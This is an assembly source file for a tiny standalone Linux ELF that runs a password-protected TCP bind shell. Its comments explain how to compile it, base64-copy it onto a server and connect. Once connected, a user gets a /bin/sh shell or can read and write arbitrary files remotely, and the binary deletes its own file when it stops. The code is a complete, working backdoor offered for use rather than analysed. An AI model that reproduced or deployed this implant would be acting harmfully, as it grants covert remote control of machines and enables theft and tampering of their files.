; TCP BIND SERVER
; compile with
; nasm -f out -o t tcp-serv.asm
; the resulting t file is the whole executable
; "cat t | base64" in order to copy to some server
; default listens on port 51574
; in order to change port:
;   python3
;   >>> import socket
;   >>> PORT = 51574 # change this to your port!
;   >>> hex(socket.htons(PORT))+'0002' # this will output the value you need to insert into the PORTANDFAMILY variable
FILENAME            equ 't' ; change this if you compile with a different filename
                            ; the program deletes the server with this filename
; default pass is "m4D$"
%define USEPASSWORD ; comment this if you don't want password
; password for login, if password is invalid at any point then we exit
; password MUST be 4 bytes long, it's unbrutable anyway, done this way for easier checking
PASSWORD            equ 't7/]'
PORTANDFAMILY       equ 0x76c90002 ; port is 51574, so the first half is htons(port), second is AF_INET

; when you connect, simply enter password and press enter
; then enter the command
; commands:
;   if the first letter is 'f', we will go into file handling mode
;       if second letter is 'r', we will go into read file mode
;           you type in the relative file path, and the server will send you the file
;       if second letter is anything else, we will go into file write mode
;           after sending the file path in one line, you should send all the data starting from the next line
;   otherwise we go into shell mode
; in otder to stop the server, simply input anything other than the password, the server will exit 

BITS 64
		org 0x00400000
ehdr:
                    db 0x7f, "ELF", 2, 1, 1, 3      ; e_ident
                    dq 0                            ; e_ident filler
                    dw 2                            ; e_type
                    dw 0x3e                         ; e_machine
                    dd 1                            ; e_version
                    dq _start                       ; e_entry
                    dq phdr - $$                    ; e_phoff
                    dq 0                            ; e_shoff
                    dd 0                            ; e_flags
                    dw ehdrsize                     ; e_ehsize
                    dw phdrsize                     ; e_phentsize
                    dw 1                            ; e_phnum
                    times 3 dw 0
ehdrsize	equ $ - ehdr
phdr:
                    dd 1
                    dd 7
                    dq 0
                    dq $$
                    dq $$
                    dq filesize
                    dq filesize
                    dq 0x1000
phdrsize	equ $ - phdr

; available commands
FILEOPS equ 'f'
READFILE equ 'r'
WRITEFILE equ 'w'
GETSHELL equ 's'

; syscall opcodes
SYS_READ            equ 0x0
SYS_WRITE           equ 0x1
SYS_OPEN            equ 0x2
SYS_CLOSE           equ 0x3
SYS_DUP2            equ 0x21
SYS_SOCKET          equ 0x29
SYS_BIND            equ 0x31
SYS_LISTEN          equ 0x32
SYS_ACCEPT          equ 0x2b
SYS_SETSOCKOPT      equ 0x36
SYS_FORK            equ 0x39
SYS_EXECVE          equ 0x3b
SYS_EXIT            equ 0x3c
SYS_UNLINK          equ 0x57

; file opening
O_RDWR              equ 0x2
O_RDWR_CREAT        equ 0x42
PERMS               equ 0644o

; constants
AF_INET             equ 0x2
SOCK_STREAM         equ 0x1
SOL_SOCKET          equ 0x1
SO_REUSEADDR        equ 0x2

_start:
; // shellcode overview
;
; sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)
; struct sockaddr = {AF_INET; {PORT; 0x0; 0x0}}
; setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &(int){1}, 4)
;
; // hold 0 connections, so 1 conn at a time
; bind(sock, &sockaddr, 16)
; listen(sock, 0)
; 
; run:
;     client = accept(sock, 0, 16) // call accept but don't save the client sockaddr
;     read(client, *passwd, 16)
;     if (*passwd != PASSWORD) goto exitserver
;     if (fork() != 0) goto nextiteration
;     read(client, *choice, 16)
;     if (*choice == FILEOPS) goto fileops
;     dup2(client, STDIN+STDOUT+STDERR)
;     execve("/bin/sh", 0, 0)
; nextiteration:
;     close(client)
;     goto run
; fileops:
;     read(client, *filename, 4096)
;     flags = O_RDWR
;     if (choice[1] == WRITEFILE)
;       flags |= O_CREAT
;     fl = open(filename, flags, 0644)
;     if (choice[1] == WRITEFILE)
;       swap(fl, client) // swap the fd's in order to read in a more compact manner
;     while ((numRead = read(fl, *buffer, 4096)) > 0)
;       write(client, *buffer, numRead)
;     goto exitserver
; exitserver:
;     exit()

make_socket:
        push SYS_SOCKET
        pop rax
        cdq                                 ; rdx = 0
        push SOCK_STREAM
        pop rsi
        push AF_INET
        pop rdi
        syscall
        push rax
        pop rdi                             ; rdi = sockfd
        push rax
        pop rbp                             ; save sockfd in rbp in order to access later

struct_sockaddr:
        ; zero out the stack for the struct
        push rdx
        mov ecx, PORTANDFAMILY
        push rcx
        
setsockopt:
        ; prepare all the registers
        mov al, SYS_SETSOCKOPT
        push 4
        pop r8 
        mov si, SOL_SOCKET
        mov dl, SO_REUSEADDR
        push 1
        push rsp
        pop r10
        syscall

getsockaddr:
        pop rcx
        push rsp
        pop rsi                             ; rsi = &sockaddr
                                            ; we don't need to save the sockaddr,
                                            ; since we will call bind/listen only once

bind_port:
        mov dl, 0x10
        mov al, SYS_BIND
        syscall

server_listen:
        xor esi, esi
        mov al, SYS_LISTEN                  ; mov al is a check that the port was bound correctly
        syscall

run_once:
        xor esi, esi
        mov al, SYS_ACCEPT                  ; rsi is zero, so we don't overwrite the server sockaddr
        syscall

        push rax
        pop rdi                             ; save child fd in rdi
        mov r15, rdi                        ; save child fd for later closing

%ifdef USEPASSWORD
password_check:
        push rsp
        pop rsi
        ; rdx is 0x10 from bind_port, so it's enough to read 8 bytes
        xor eax, eax                        ; SYS_READ = 0
        syscall
        cmp dword [rsp], PASSWORD
        jne stopserver
%endif
        mov al, SYS_FORK
        syscall
        xchg eax, ecx
        jrcxz childcase                     ; if we are the child then continue execution
        push SYS_CLOSE
        pop rax
        syscall
        push rbp
        pop rdi
        jmp run_once      
childcase:
        ; read the function we want to call
        ; all the params are already set
        syscall                             ; SYS_READ
        cmp byte [rsp], FILEOPS
        je fileops

; since we aren't reading or writing, create a shell as the default setting
runshell:
dup2_fds:
        ; dup2 client socket into stdin, stdout, stderr
        push 0x3
        pop rsi

dup2_loop:
        dec esi
        mov al, SYS_DUP2
        syscall
        jnz dup2_loop

exec_shell:
        ; call /bin/sh
        push rsi                            ; rsi is 0 after loop
        pop rdx

        push rsi
        mov rdi, '//bin/sh'
        push rdi
        push rsp
        pop rdi

        mov al, SYS_EXECVE                  ; finally call execve in child
        syscall

stopserver:
        push FILENAME
        push rsp
        pop rdi
        mov al, SYS_UNLINK
        syscall
exitserver:
        mov al, SYS_EXIT
        syscall
        
fileops:
        cmp byte [rsp + 1], WRITEFILE
        sete bl
        xchg dl, dh
        mov ebp, edx                        ; rbp stores 0x1000 - the size of buffer for reading                             
        sub rsp, rbp
        push rsp
        pop rsi                             ; create buffer and save pointer in rsi
        xor eax, eax
        syscall                             ; read the filename into buffer, all params are set
        dec eax                             ; the location of '\n'
        mov byte [rsi + rax], 0
        mov dx, PERMS
        push O_RDWR
        test bl, bl
        jz readfileop                      ; if not equal to write file, then default mode is reading file
        pop rdi
        push O_RDWR_CREAT
readfileop:
        push rsi
        pop rdi
        pop rsi
        push SYS_OPEN
        pop rax
        syscall                             ; open the file with correct permissions
        push rsp
        pop rsi                             ; set rsi to point to the buffer
        push rax
        pop rbx                             ; rbx will be the file descriptor of the opened file (socket in r15)
        jz nowritefile                      ; if we are reading then we don't need to swap file descriptors
        xchg rbx, r15
nowritefile:
readloop:
        push rbx
        pop rdi
        mov edx, ebp
        xor eax, eax
        syscall                             ; read data to buffer
        xchg eax, ecx
        jrcxz exitserver                    ; if we read zero bytes then stop                       
        push rax
        pop rdx
        mov rdi, r15
write_loop:
        push SYS_WRITE
        pop rax
        syscall
        sub edx, eax
        jg write_loop                      ; write data while we still have data to write
        jmp readloop

filesize equ $ - $$
